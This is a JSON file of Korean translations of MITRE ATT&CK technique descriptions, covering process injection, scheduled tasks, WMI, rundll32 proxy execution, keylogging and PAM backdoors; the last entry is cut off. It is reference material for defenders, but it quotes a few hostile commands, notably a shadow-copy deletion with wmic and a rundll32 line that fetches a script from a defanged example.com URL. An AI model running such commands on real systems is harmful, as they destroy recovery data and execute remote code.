[
  {
    "title": "Extra Window Memory Injection",
    "description": "적대자는 프로세스 기반 방어를 회피하고 권한을 상승시키기 위해 Extra Window Memory (EWM)를 통해 악성 코드를 프로세스에 주입할 수 있습니다. EWM 주입은 별도의 실행 중인 프로세스의 주소 공간에서 임의 코드를 실행하는 방법입니다.\n\n윈도우를 생성하기 전에, 그래픽 Windows 기반 프로세스는 윈도우 클래스에 규정하거나 등록해야 하며, 이는 외관과 동작을 규정합니다. 새로운 윈도우 클래스의 등록에는 각 인스턴스의 할당된 메모리에 최대 40바이트의 EWM를 추가 요청할 수 있습니다. 이 EWM는 해당 윈도우에 특정한 데이터를 저장하는 데 사용되며, 값을 설정하고 가져오는 특정 애플리케이션 프로그래밍 인터페이스(API) 기능이 있습니다.\n\n작지만 EWM는 32비트 포인터를 저장할 수 있을 만큼 충분히 크며, 종종 윈도우 절차를 가리키는 데 사용됩니다. 악성 소프트웨어는 코드 작성을 포함하는 공격 사슬의 일부로 이 메모리 위치를 이용할 수 있으며, 프로세스의 메모리 공유 섹션에 코드를 작성하고 EWM에 코드에 대한 포인터를 두고, 프로세스의 EWM의 주소로 제어를 반환하여 실행을 호출할 수 있습니다.\n\nEWM 주입을 통해 부여된 실행은 대상 프로세스의 메모리 및 권한 상승에 대한 접근을 허용할 수 있습니다. 공유 섹션에 페이로드를 작성하는 것은 <code>WriteProcessMemory</code>와 <code>CreateRemoteThread</code>와 같은 고도로 모니터링되는 API 호출을 피할 수 있습니다. 더 정교한 악성 소프트웨어 샘플은 윈도우 절차 및 기타 시스템 기능의 조합을 트리거하여 대상 프로세스 내의 실행 가능한 부분에 악성 페이로드를 재작성함으로써 데이터 실행 방지(DEP)와 같은 보호 메커니즘을 우회할 수 있습니다.\n\n다른 프로세스의 컨텍스트에서 코드를 실행하면 해당 프로세스의 메모리, 시스템/네트워크 자원 및 권한 상승에 대한 접근을 허용할 수 있습니다. EWM 주입을 통한 실행은 정당한 프로세스 아래에서 마스킹되기 때문에 보안 제품으로부터 탐지를 피할 수 있습니다.",
    "external_id": "T1055.011",
    "modified": "2020-11-10T18:29:31.004Z",
    "translated": true
  },
  {
    "title": "Scheduled Task",
    "description": "적대자는 Windows 작업 스케줄러를 악용하여 악성 코드의 초기 또는 반복 실행을 위한 작업 일정을 수행할 수 있습니다. Windows에서 작업 스케줄러에 접근하는 방법은 여러 가지가 있습니다. `schtasks` 유틸리티는 명령줄에서 직접 실행할 수 있으며, 작업 스케줄러는 제어판의 관리 도구 섹션을 통해 GUI로 열 수 있습니다. 경우에 따라 적대자는 Windows 작업 스케줄러를 위한 .NET 래퍼를 사용하거나, Windows netapi32 라이브러리와 Windows Management Instrumentation(WMI)를 사용하여 예약 작업을 생성한 사례도 있습니다. 적대자는 또한 WMI 클래스 `PS_ScheduledTask`를 활용하여 XML 경로를 통해 예약 작업을 생성하는 Powershell Cmdlet `Invoke-CimMethod`를 이용할 수 있습니다.\n\n적대자는 Windows 작업 스케줄러를 사용하여 시스템 시작 시 또는 정기적으로 프로그램을 실행하여 지속성을 유지할 수 있습니다. Windows 작업 스케줄러는 측면 이동의 일환으로 원격 실행을 수행하거나 지정된 계정(예: SYSTEM)의 컨텍스트에서 프로세스를 실행하는 데 악용될 수도 있습니다. 시스템 이진 프로세스의 프록시 실행과 유사하게, 적대자는 Windows 작업 스케줄러를 악용하여 서명되었거나 신뢰할 수 있는 시스템 프로세스 아래에서 일회성 실행을 숨길 가능성도 있습니다.\n\n적대자는 방어 도구나 수동 쿼리로 작업을 열거할 때 보이지 않는 \"숨겨진\" 예약 작업을 생성할 수도 있습니다. 구체적으로, 적대자는 `schtasks /query`와 작업 스케줄러에서 작업을 숨기기 위해 관련된 보안 설명자(Security Descriptor, SD) 레지스트리 값을 삭제할 수 있습니다(이 값의 삭제는 SYSTEM 권한으로 완료되어야 합니다). 적대자는 또한 관련 레지스트리 키 내에서 메타데이터(예: `Index` 값)를 변경하는 등의 대체 방법을 사용하여 작업을 숨길 수 있습니다.",
    "external_id": "T1053.005",
    "modified": "2024-10-13T16:13:47.770Z",
    "translated": true
  },
  {
    "title": "Socket Filters",
    "description": "적대자는 네트워크 소켓에 필터를 부착하여 모니터링한 후 지속성 또는 명령 및 제어에 사용되는 백도어를 활성화할 수 있습니다. 권한이 상승한 경우, 적대자는 `libpcap` 라이브러리와 같은 기능을 사용하여 소켓을 열고 특정 유형의 데이터가 소켓을 통해 전송되도록 허용하거나 차단하기 위해 필터를 설치할 수 있습니다. 필터는 지정된 네트워크 인터페이스를 통과하는 모든 트래픽에 적용될 수 있으며(지정되지 않은 경우 모든 인터페이스에 적용됨) 네트워크 인터페이스가 필터 기준과 일치하는 패킷을 수신할 때 추가 작업이 호스트에서 트리거될 수 있습니다. 예를 들어, 리버스 셸이 활성화될 수 있습니다.\n\n연결을 설정하기 위해, 적대자는 설치된 필터 기준과 일치하는 패킷을 대상 호스트로 전송합니다. 적대자는 이러한 소켓 필터를 사용하여 임플란트 설치를 촉발하고, 핑 백을 수행하며, 명령 셸을 호출할 수 있습니다. 이러한 소켓 필터와의 통신은 프로토콜 터널링과 함께 사용할 수도 있습니다.\n\n필터는 `libpcap`이 설치된 모든 유닉스 계열 플랫폼이나 Windows 호스트에서 `Winpcap`을 사용하여 설치할 수 있습니다. 적대자는 `pcap_setfilter`가 포함된 `libpcap` 또는 `SO_ATTACH_FILTER` 옵션이 포함된 표준 라이브러리 함수 `setsockopt`를 사용할 수 있습니다. 패킷이 수신될 때까지 소켓 연결이 활성화되지 않기 때문에, 이러한 행동은 호스트에서 활동 부족, 낮은 CPU 오버헤드 및 원시 소켓 사용에 대한 제한된 가시성으로 인해 탐지하기 어려울 수 있습니다.",
    "external_id": "T1205.002",
    "modified": "2022-10-20T19:56:18.579Z",
    "translated": true
  },
  {
    "title": "Archive via Utility",
    "description": "적대자는 데이터를 외부로 반출하기 전에 수집된 데이터를 압축하거나 암호화하기 위해 유틸리티를 사용할 수 있습니다. 많은 유틸리티는 데이터를 운반하기 쉬운 형식으로 압축, 암호화 또는 패키징하는 기능을 포함하고 있습니다.\n\n적대자는 외부로 반출하기 전에 데이터를 압축하거나 암호화하기 위해 다양한 유틸리티를 악용할 수 있습니다. 일부 타사 유틸리티는 Linux와 macOS에서 사용하는 `tar`나 Windows 시스템에서 사용하는 `zip`과 같이 사전 설치되어 있을 수 있습니다.\n\nWindows에서는 `diantz`나 `makecab`을 사용하여 수집된 파일을 CAB(.cab) 파일로 패키징할 수 있습니다. `diantz`는 또한 원격 위치에서 파일을 다운로드하고 압축하는 데 사용할 수 있습니다. Windows의 `xcopy`는 다양한 옵션으로 파일 및 디렉터리를 복사할 수 있습니다. 추가로, 적대자는 수집된 데이터를 외부로 반출하기 전에 `certutil`을 사용하여 Base64로 인코딩할 수 있습니다.\n\n또한 적대자는 7-Zip, WinRAR, WinZip과 같은 타사 유틸리티를 사용하여 유사한 작업을 수행할 수 있습니다.",
    "external_id": "T1560.001",
    "modified": "2023-09-15T19:02:53.995Z",
    "translated": true
  },
  {
    "title": "VNC",
    "description": "대적자들은 유효한 계정을 사용하여 가상 네트워크 컴퓨팅(VNC)을 통해 원격으로 기계를 제어할 수 있습니다. VNC는 사용자가 네트워크를 통해 화면, 마우스 및 키보드 입력을 중계하여 다른 컴퓨터의 디스플레이를 원격으로 제어할 수 있도록 하는 플랫폼 독립적인 데스크톱 공유 시스템입니다.\n\nVNC는 리모트 데스크톱 프로토콜(RDP)과 다르며, VNC는 리소스 공유 소프트웨어가 아닌 화면 공유 소프트웨어입니다. 기본적으로 VNC는 시스템의 인증을 사용하지만, VNC에 특화된 자격 증명을 사용하도록 구성할 수도 있습니다.\n\n대적자들은 VNC를 악용하여 로그인된 사용자로서 문서를 열거나 파일을 다운로드하거나 임의의 명령을 실행하는 등의 악의적인 행동을 수행할 수 있습니다. 대적자는 VNC를 사용하여 원격으로 시스템을 제어하고 모니터링하여 데이터를 수집하고 네트워크 내의 다른 시스템으로 이동할 수 있습니다. 특정 VNC 라이브러리/구현은 또한 무차별 대입 공격 및 메모리 사용 악용에 취약했습니다.",
    "external_id": "T1021.005",
    "modified": "2024-09-12T15:20:07.264Z",
    "translated": true
  },
  {
    "title": "Windows Management Instrumentation",
    "description": "적대자는 Windows 관리 도구(WMI)를 악용하여 악성 명령 및 페이로드를 실행할 수 있습니다. WMI는 프로그래머를 위해 설계되었으며 Windows 시스템의 관리 데이터와 작업을 위한 인프라입니다. WMI는 Windows 시스템 구성 요소에 접근하기 위한 통합 환경을 제공하는 관리 기능입니다.\n\nWMI 서비스는 로컬 및 원격 접근을 모두 가능하게 하지만, 후자는 원격 서비스에 의해 지원됩니다. 원격 DCOM을 통한 WMI는 포트 135를 사용하며, WinRM을 통한 WMI는 HTTP 사용 시 포트 5985, HTTPS 사용 시 포트 5986에서 작동합니다.\n\n적대자는 WMI를 사용하여 로컬 및 원격 시스템과 상호 작용하고, 다양한 행동을 실행하는 수단으로 사용할 수 있습니다. 예를 들어, `wmic.exe`는 적대자가 `wmic.exe Shadowcopy Delete` 명령을 사용하여 그림자 복사를 삭제하는 데 악용될 수 있습니다.\n\n**참고:** `wmic.exe`는 2024년 1월부터 지원이 종료되며, Windows 11 이상에서는 WMIC 기능이 기본적으로 비활성화됩니다. WMIC는 이후의 Windows 릴리스에서 제거되고, WMI 인터페이스의 주 본체로서 PowerShell로 대체될 예정입니다. PowerShell 및 `wbemtool.exe`와 같은 도구 외에도 C++, .NET, VBScript 등을 통해 WMI와 프로그래밍적으로 상호 작용할 수 있는 COM API도 사용될 수 있습니다.",
    "external_id": "T1047",
    "modified": "2024-10-15T15:20:57.328Z",
    "translated": true
  },
  {
    "title": "Screen Capture",
    "description": "적대자는 작전 중 정보를 수집하기 위해 데스크톱의 화면 캡처를 시도할 수 있습니다. 화면 캡처 기능은 타격 후 운영에서 사용되는 원격 액세스 도구의 기능으로 포함될 수 있습니다. 스크린샷을 찍는 것은 일반적으로 기본 유틸리티나 API 호출을 통해서도 가능합니다.",
    "external_id": "T1113",
    "modified": "2023-03-30T21:01:39.967Z",
    "translated": true
  },
  {
    "title": "Fileless Storage",
    "description": "적대자는 방어 시스템으로부터 악의적인 활동을 숨기기 위해 \"파일 없는\" 형식으로 데이터를 저장할 수 있습니다. 파일 없는 저장 방식은 파일 이외의 모든 형식으로 대략 정의될 수 있습니다. Windows 시스템에서 비휘발성 파일 없는 저장의 일반적인 예로는 Windows 레지스트리, 이벤트 로그 또는 WMI 저장소가 있습니다. Linux 시스템에서는 `/dev/shm`, `/run/shm`, `/var/run`, `/var/lock`와 같은 공유 메모리 디렉터리도 파일 없는 저장으로 간주될 수 있습니다. 이 디렉터리에 작성된 파일은 직접 RAM에 매핑되고 디스크에 저장되지 않습니다.\n\n파일 없는 메모리 행동인 반사 코드 로딩이나 프로세스 주입과 유사하게, 파일 없는 데이터 저장은 특정 파일 형식에만 접근할 수 있는 안티바이러스 및 기타 엔드포인트 보안 도구에 의해 탐지되지 않을 수 있습니다. 파일 없는 저장을 활용하면 적대자가 Linux의 읽기 전용 파일 시스템에서 제공하는 보호를 우회하는 것도 가능할 수 있습니다.\n\n적대자는 파일 없는 저장을 사용하여 페이로드/셸코드와 같이 다양한 유형의 저장된 데이터를 숨길 수 있으며, 이는 피해자로부터 아직 유출되지 않은 수집된 데이터일 수 있습니다. 또한 적대자는 이러한 파일 없는 데이터를 저장할 때 종종 암호화, 인코딩, 잘라내기 또는 다른 방식으로 난독화합니다.\n\n일부 형태의 파일 없는 저장 활동은 간접적으로 파일 시스템에 아티팩트를 생성할 수 있지만, WMI나 레지스트리와 같이 중앙 집합적이고 검사하기 어려운 형식의 물리적 파일에서는 그렇습니다.",
    "external_id": "T1027.011",
    "modified": "2024-10-04T15:05:25.388Z",
    "translated": true
  },
  {
    "title": "Boot or Logon Initialization Scripts",
    "description": "적대자는 부팅 또는 로그온 초기화 시 자동으로 실행되는 스크립트를 사용하여 영속성을 확립할 수 있습니다. 초기화 스크립트는 관리 기능을 수행하는 데 사용될 수 있으며, 종종 다른 프로그램을 실행하거나 내부 로깅 서버에 정보를 전송할 수 있습니다. 이러한 스크립트는 운영 체제에 따라 다르며, 로컬 또는 원격 적용 여부에 따라 다를 수 있습니다.\n\n적대자는 이러한 스크립트를 사용하여 단일 시스템에서 영속성을 유지할 수 있습니다. 로그온 스크립트의 접근 구성에 따라 로컬 자격 증명이나 관리자 계정이 필요할 수 있습니다.\n\n적대자는 또한 일부 부팅 또는 로그온 초기화 스크립트가 더 높은 권한으로 실행되므로 자신의 권한을 상승시킬 수 있습니다.",
    "external_id": "T1037",
    "modified": "2024-04-16T12:23:13.621Z",
    "translated": true
  },
  {
    "title": "Adversary-in-the-Middle",
    "description": "적대자는 중간자 공격(AiTM) 기법을 사용하여 두 개 이상의 네트워크 장치 사이에 자신을 위치시키려 할 수 있으며, 이를 통해 네트워크 스니핑, 전송 데이터 조작 또는 재전송 공격과 같은 후속 행동을 지원할 수 있습니다. 일반적인 네트워킹 프로토콜의 기능을 악용하여 네트워크 트래픽의 흐름을 결정할 수 있으며, 적대자는 장치가 자신이 통제하는 시스템을 통해 통신하도록 강요하여 정보를 수집하거나 추가 작업을 수행할 수 있습니다.\n\n예를 들어, 적대자는 피해자의 DNS 설정을 조작하여 합법적인 사이트에 접근하지 못하도록 하거나 추가 맬웨어를 배포하는 등의 악의적인 활동을 가능하게 할 수 있습니다. 적대자는 또한 DNS를 조작하고 자신의 위치를 활용하여 사용자 자격 증명을 가로채려고 시도할 수 있습니다. 이는 접근 토큰 및 세션 쿠키를 포함합니다. 다운그레이드 공격도 AiTM 위치를 설정하는 데 사용되며, 이는 더 안전하지 않거나 구식인 통신 프로토콜 또는 암호화 알고리즘을 협상하는 방식으로 수행될 수 있습니다.\n\n적대자는 AiTM 위치를 활용하여 트래픽을 모니터링하고/또는 수정하려고 시도할 수 있으며, 이는 전송 데이터 조작과 관련이 있습니다. 적대자는 AiTM과 유사한 위치를 설정하여 트래픽이 적절한 목적지로 흐르지 못하도록 방해할 수 있으며, 이는 방어력을 약화시키거나 네트워크 서비스 거부 공격을 지원하기 위함일 수 있습니다.",
    "external_id": "T1557",
    "modified": "2024-04-18T14:26:21.852Z",
    "translated": true
  },
  {
    "title": "System Owner/User Discovery",
    "description": "적대자는 주요 사용자, 현재 로그인한 사용자, 시스템을 일반적으로 사용하는 사용자 목록 또는 사용자가 시스템을 적극적으로 사용하고 있는지 여부를 식별하려고 시도할 수 있습니다. 그들은 예를 들어, 계정 사용자 이름을 검색하거나 자격 증명을 수집하는 방법을 사용할 수 있습니다. 이 정보는 시스템 전체에 걸쳐 사용자 및 사용자 이름 세부정보가 널리 퍼져 있기 때문에 실행 중인 프로세스 소유권, 파일/디렉터리 소유권, 세션 정보 및 시스템 로그를 포함하여 여러 가지 다른 탐색 기술을 사용하여 수집될 수 있습니다. 적대자는 자동화된 탐색 중에 이 정보를 사용하여 후속 행동을 결정할 수 있으며, 여기에는 적대자가 대상 시스템을 완전히 감염시키는지 여부와 특정 작업을 시도하는지가 포함됩니다.\n\n이 정보를 획득하는 데 사용할 수 있는 다양한 유틸리티와 명령이 있으며, 예를 들어 `whoami` 명령이 있습니다. macOS와 Linux에서는 현재 로그인한 사용자를 식별하기 위해 `w` 및 `who` 명령을 사용할 수 있습니다. macOS에서는 `dscl . list /Users | grep -v '_'` 명령을 사용하여 사용자 계정을 나열할 수 있습니다. 또한 `%USERNAME%` 및 `$USER`와 같은 환경 변수를 사용하여 이 정보에 접근할 수 있습니다.\n\n네트워크 장치에서는 `show users` 및 `show ssh`와 같은 명령을 사용하여 현재 장치에 로그인한 사용자들을 표시할 수 있습니다.",
    "external_id": "T1033",
    "modified": "2023-09-29T19:50:06.736Z",
    "translated": true
  },
  {
    "title": "Acquire Infrastructure",
    "description": "적대 세력은 타깃으로 삼기 위해 인프라를 구매, 임대, 대여 또는 확보할 수 있다. 적대 세력의 작전을 호스팅하고 조정하기 위한 다양한 인프라가 존재한다. 인프라 솔루션에는 물리적 또는 클라우드 서버, 도메인 및 제3자 웹 서비스가 포함된다. 일부 인프라 제공자는 제한된 비용 또는 무료로 인프라를 확보할 수 있는 무료 체험 기간을 제공한다. 또한, 봇넷은 임대하거나 구매할 수 있다.\n\n이러한 인프라 솔루션의 사용은 적대 세력이 작전을 준비하고, 실행하며, 추진하도록 허용한다. 솔루션은 제3자 웹 서비스에 연락하거나 지원을 위한 인프라를 획득하는 것과 같이 정상으로 보이는 트래픽과 적대 세력의 작전이 혼합되도록 도와줄 수 있다. 구현 방식에 따라, 적대 세력은 자신들과 물리적으로 연관 짓기 어려운 인프라를 사용할 수 있으며, 신속하게 프로비저닝되고 수정되며 종료될 수 있는 인프라를 활용할 수 있다.",
    "external_id": "T1583",
    "modified": "2024-10-16T20:03:59.884Z",
    "translated": true
  },
  {
    "title": "Rundll32",
    "description": "적대자들은 rundll32.exe를 악성 코드의 실행을 프록시하기 위해 악용할 수 있습니다. rundll32.exe를 사용하여 직접 실행하는 대신, 특정 보안 도구들이 rundll32.exe 프로세스의 실행을 모니터링하지 않기 때문에(예: 화이트리스트나 정상 작동으로 인한 오탐지), 보안 도구를 트리거하지 않을 수 있습니다. rundll32.exe는 일반적으로 DLL 페이로드를 실행하는 데 연관됩니다.\n\nrundll32.exe는 undocumented shell32.dll 기능인 Control_RunDLL 및 Control_RunDLLAsUser를 통해 제어판 항목 파일(.cpl)을 실행하는 데에도 사용될 수 있습니다. .cpl 파일을 두 번 클릭하면 rundll32.exe가 실행됩니다. 예를 들어, ClickOnce는 rundll32.exe를 통해 프록시될 수 있습니다.\n\nrundll32는 JavaScript와 같은 스크립트를 실행하는 데에도 사용될 수 있습니다. 이는 다음과 유사한 구문을 사용하여 수행할 수 있습니다: rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\") 이 행동은 Poweliks와 같은 악성 소프트웨어에서 사용되는 것이 발견되었습니다.\n\n적대자들은 rundll32.exe가 DLL 함수 이름을 로드하는 방식을 악용하여 악성 코드를 분석으로부터 숨기려 할 수 있습니다. Windows가 다양한 문자 집합에 대한 호환성 지원의 일환으로, rundll32.exe는 지정된 함수를 로드하기 전에 먼저 wide/Unicode와 ANSI 문자를 지원하는 함수를 확인합니다. 따라서 적대자들은 harmless 함수에 W와/혹은 A를 추가하여 여러 개의 동일한 내보내기 함수 이름을 만들어 악성 코드를 숨길 수 있습니다. DLL 함수는 또한 ordinal 번호를 통해 내보내지고 실행될 수 있습니다.\n\n추가적으로, 적대자들은 DLL 파일 이름, 파일 확장자 또는 함수 이름을 변경하는 것과 같은 위장 기술을 사용하여 악성 페이로드 실행을 더욱 감추려고 할 수 있습니다.",
    "external_id": "T1218.011",
    "modified": "2024-10-14T13:14:43.083Z",
    "translated": true
  },
  {
    "title": "Container and Resource Discovery",
    "description": "적대자는 컨테이너 환경 내에서 사용 가능한 컨테이너 및 기타 자원을 발견하려고 시도할 수 있습니다. 다른 자원에는 이미지, 배포, 포드, 노드 및 클러스터의 상태와 같은 기타 정보가 포함될 수 있습니다.\n\n이러한 자원은 웹 애플리케이션을 통해 볼 수 있으며, Docker 및 Kubernetes API를 통해 쿼리할 수 있습니다. Docker에서는 로그가 환경에 대한 정보, 즉 환경의 구성, 사용 가능한 서비스 및 피해자가 이용할 수 있는 클라우드 공급자에 대한 정보를 유출할 수 있습니다. 이러한 자원의 발견은 적대자의 환경 내에서 다음 단계, 즉 측면 이동을 수행하는 방법과 실행에 사용할 방법을 결정하는 데 도움을 줄 수 있습니다.",
    "external_id": "T1613",
    "modified": "2023-04-15T16:08:50.706Z",
    "translated": true
  },
  {
    "title": "Serverless",
    "description": "적대 세력은 타겟팅 중에 사용할 수 있는 서버리스 클라우드 인프라(예: Cloudflare Workers, AWS Lambda 함수 또는 Google Apps Scripts)를 구매하고 구성할 수 있습니다. 서버리스 인프라를 활용함으로써, 적대 세력은 운영 중에 사용된 인프라를 자신에게 다시 귀속시키기 어렵게 만들 수 있습니다.\n\n한번 확보되면, 서버리스 런타임 환경을 이용하여 감염된 기계에 직접 응답하거나 트래픽을 적대 세력이 소유한 명령 및 제어 서버로 프록시할 수 있습니다. 이러한 함수에서 생성된 트래픽은 일반 클라우드 제공업체의 서브도메인에서 오는 것처럼 보이기 때문에, 이러한 제공업체로의 일반 트래픽과 구분하기 어려워져 인프라를 숨기기 더 용이해집니다.",
    "external_id": "T1583.007",
    "modified": "2024-07-01T20:24:16.562Z",
    "translated": true
  },
  {
    "title": "Standard Encoding",
    "description": "적대자는 명령 및 제어 트래픽의 내용을 더 어렵게 감지할 수 있도록 표준 데이터 인코딩 시스템을 사용하여 데이터를 인코딩할 수 있습니다. 명령 및 제어(C2) 정보는 기존 프로토콜 사양을 준수하는 표준 데이터 인코딩 시스템을 사용하여 인코딩될 수 있습니다. 일반적인 데이터 인코딩 방식에는 ASCII, 유니코드, 16진수, Base64 및 MIME이 포함됩니다. 일부 데이터 인코딩 시스템은 gzip과 같은 데이터 압축을 초래할 수도 있습니다.",
    "external_id": "T1132.001",
    "modified": "2023-03-03T00:31:33.071Z",
    "translated": true
  },
  {
    "title": "Embedded Payloads",
    "description": "적대자는 방어 시스템으로부터 악성 콘텐츠를 숨기기 위해 다른 파일 내에 페이로드를 삽입할 수 있습니다. 그 외에 겉보기에는 무해한 파일(예: 스크립트 및 실행 파일)은 악성 페이로드와 콘텐츠를 운반하고 혼란스럽게 만드는 데 악용될 수 있습니다. 경우에 따라, 삽입된 페이로드는 적대자가 실행 제어(예: 디지털 서명 및 공증 티켓)에 영향을 주지 않음으로써 신뢰 통제를 전복하는 데도 사용될 수 있습니다.\n\n적대자는 다양한 파일 형식에 페이로드를 삽입하여 이를 숨길 수 있습니다. 이는 특정 유형의 디지털 미디어 형식과 관련된 바이트와 패턴에 악성 콘텐츠를 엮는 스테가노그래피와 유사하지만, 그와는 다릅니다.\n\n예를 들어, 적대자는 겉보기에는 무해한 이진 파일 내에 또는 그 위에 페이로드를 삽입하는 것이 관찰되었습니다. 또한 적대자는 같은 형식의 파일 내에 실행 파일이나 실행 전용 스크립트와 같은 페이로드를 중첩시켜 삽입하는 것도 관찰되었습니다.\n\n삽입된 콘텐츠는 무해한 시스템 프로세스를 감염시키는 데 사용되는 프로세스 주입 페이로드로 사용될 수도 있습니다. 이러한 삽입된 후 주입된 페이로드는 악성 코드 모듈의 일부분으로 사용되어 특정 기능(예: C2 통신 암호화)을 제공하도록 설계될 수 있습니다. 예를 들어, 삽입된 모듈은 기본 브라우저에 주입되어 적대자가 네트워크를 통해 통신할 수 있도록 합니다.",
    "external_id": "T1027.009",
    "modified": "2023-09-29T21:14:57.263Z",
    "translated": true
  },
  {
    "title": "Pluggable Authentication Modules",
    "description": "적대자는 플러그형 인증 모듈(PAM)을 수정하여 사용자 자격 증명에 접근하거나 비정당한 계정 접근을 허용할 수 있습니다. PAM은 다양한 서비스의 인증을 안내하는 구성 파일, 라이브러리 및 실행 파일의 모듈형 시스템입니다. 가장 일반적인 인증 모듈은 계정 인증 정보를 검색, 설정 및 검증하는 <code>pam_unix.so</code>입니다.\n\n적대자는 PAM 시스템의 구성 요소를 수정하여 백도어를 생성할 수 있습니다. <code>pam_unix.so</code>와 같은 PAM 구성 요소는 자격 증명으로서 적대자가 제공하는 임의의 값을 허용하도록 패치될 수 있습니다.\n\nPAM 시스템에 대한 악의적인 수정은 자격 증명을 훔치는 데도 악용될 수 있습니다. 적대자는 PAM 리소스를 감염시켜 사용자 자격 증명을 수집할 수 있으며, PAM 구성 요소와 교환되는 값은 암호를 저장하지 않기 때문에 일반 텍스트일 수 있습니다.",
    "external_id": "T1556.003",
    "modified": "2024-08-21T16:19:55.082Z",
    "translated": true
  },
  {
    "title": "Revert Cloud Instance",
    "description": "적대자는 악의적인 활동 후에 감지를 피하고 자신의 존재에 대한 증거를 제거하기 위해 클라우드 인스턴스에서 변경된 사항을 되돌릴 수 있습니다. 클라우드 기반 인프라와 같은 고도로 가상화된 환경에서는 클라우드 관리 대시보드나 클라우드 API를 통해 가상 머신(VM) 또는 데이터 저장소 스냅샷을 복원함으로써 이를 수행할 수 있습니다.\n\n이 기술의 또 다른 변형은 컴퓨팅 인스턴스에 부착된 임시 저장소를 활용하는 것입니다. 대부분의 클라우드 제공업체는 지속적인 저장소, 로컬 저장소 및/또는 잠시의 저장소를 포함한 다양한 유형의 저장소를 제공하며, 임시 저장소 유형은 VM이 중지/재시작될 때 종종 초기화됩니다.",
    "external_id": "T1578.004",
    "modified": "2021-03-08T10:33:02.128Z",
    "translated": true
  },
  {
    "title": "Gather Victim Host Information",
    "description": "적대 세력은 목표의 호스트에 대한 정보를 모을 수 있으며, 이 정보는 목표 설정에 사용될 수 있습니다. 호스트에 대한 정보에는 관리 데이터(예: 이름, 할당된 IP, 기능 등)와 구성 세부정보(예: 운영 체제, 언어 등)가 포함될 수 있습니다.\n\n적대 세력은 다양한 방법으로 이 정보를 수집할 수 있으며, 예를 들어 직접적인 수집 행동이나 피싱을 통해 수집할 수 있습니다. 또한 적대 세력은 사이트를 손상시켜 방문자로부터 호스트 정보를 수집하기 위해 설계된 악성 콘텐츠를 포함할 수도 있습니다. 호스트에 대한 정보는 온라인이나 기타 접근 가능한 데이터 세트를 통해서도 적대 세력에게 노출될 수 있습니다. 이러한 정보를 수집하는 것은 다른 형태의 정찰 기회를 드러낼 수 있으며, 운영 자원을 구축하거나 초기 접근을 확보하는 데 도움이 될 수 있습니다.\n\n또한 적대 세력은 User-Agent HTTP 헤더를 통해 피해자의 호스트 정보를 수집할 수 있습니다. 이는 서버에 전송되어 요청하는 사용자 에이전트의 애플리케이션, 운영 체제, 공급업체 및 버전을 식별하는 데 사용됩니다. 이는 적대 세력의 후속 행동에 정보를 제공하는 데 활용될 수 있습니다. 예를 들어, 적대 세력은 요청하는 운영 체제에 맞는 사용자 에이전트를 확인한 후, 목표 운영 체제에만 악성 코드를 제공하고 다른 운영 체제는 무시할 수 있습니다.",
    "external_id": "T1592",
    "modified": "2024-10-03T19:35:07.269Z",
    "translated": true
  },
  {
    "title": "Keylogging",
    "description": "적대자는 사용자가 입력하는 동안 자격 증명을 가로채기 위해 사용자 키 입력을 기록할 수 있습니다. 키로깅은 자격 증명을 확보하기 위해 사용할 가능성이 높습니다. 특히, 운영 체제 자격 증명 덤핑 작업이 효과적이지 않을 때 새로운 접근 기회를 위해 사용되며, 자격 증명을 성공적으로 캡처하기 위해 적대자가 시스템에서 상당한 기간 동안 키 입력을 가로채야 할 수도 있습니다. 자격 증명을 빠르게 캡처할 가능성을 높이기 위해 적대자는 사용자가 시스템에 다시 인증하도록 강제하기 위해 브라우저 쿠키를 지우는 등의 조치를 취할 수 있습니다.\n\n키로깅은 입력 캡처의 가장 보편적인 유형으로, 키 입력을 가로채는 여러 가지 방법이 있습니다. 일부 방법은 다음과 같습니다:\n\n* 키 입력 처리를 위해 사용되는 API 콜백 훅킹. 자격 증명 API 훅킹과는 달리, 이는 오직 키 입력 데이터 처리를 위한 API 기능에만 초점을 맞춥니다.\n* 하드웨어 버퍼에서 원시 키 입력 데이터를 읽기.\n* Windows 레지스트리 수정.\n* 사용자 정의 드라이버.\n* 시스템 이미지 수정을 통해 적대자는 네트워크 장치의 운영 체제에 대한 훅을 제공받아 로그인 세션을 위한 원시 키 입력을 읽을 수 있습니다.",
    "external_id": "T1056.001",
    "modified": "2023-10-01T14:01:12.167Z",
    "translated": true
  },
  {
    "title": "File/Path Exclusions",
    "description": "적대 세력은 파일 기반 아티팩트를 특정 폴더나 파일 이름에 기록함으로써 이를 숨기려고 할 수 있습니다. 이 폴더나 파일 이름은 안티바이러스(AV) 스캔 및 기타 방어 기능에서 제외됩니다. AV와 기타 파일 기반 스캐너는 성능 최적화와 애플리케이션의 설치 및 합법적인 사용을 용이하게 하기 위해 종종 제외 항목을 포함합니다. 이러한 제외는 문맥적일 수 있으며(예: 특정 유발 사건/알림에 응답하여 스캔이 시작됨), 종종 특정 폴더 및/또는 신뢰할 수 있는 합법적인 것으로 간주되는 파일을 참조하는 하드코딩된 문자열을 포함합니다.\n\n적대 세력은 이러한 제외를 악용하여 파일 기반 아티팩트를 숨길 수 있습니다. 예를 들어, 도구 설정을 조작하여 새로운 제외 항목을 추가하는 대신(예: 도구 비활성화 또는 수정), 적대 세력은 기본값 또는 잘 알려진 제외 항목에 파일 기반 페이로드를 배치할 수 있습니다. 적대 세력은 또한 탐색 및 정찰 활동을 통해 피해 환경에서 기존 제외 항목을 발견하고 검증하는 작업을 수행할 수 있습니다.",
    "external_id": "T1564.012",
    "modified": "2024-04-15T23:42:39.831Z",
    "translated": true
  },
  {
    "title": "Linux and Mac File and Directory Permissions Modification",
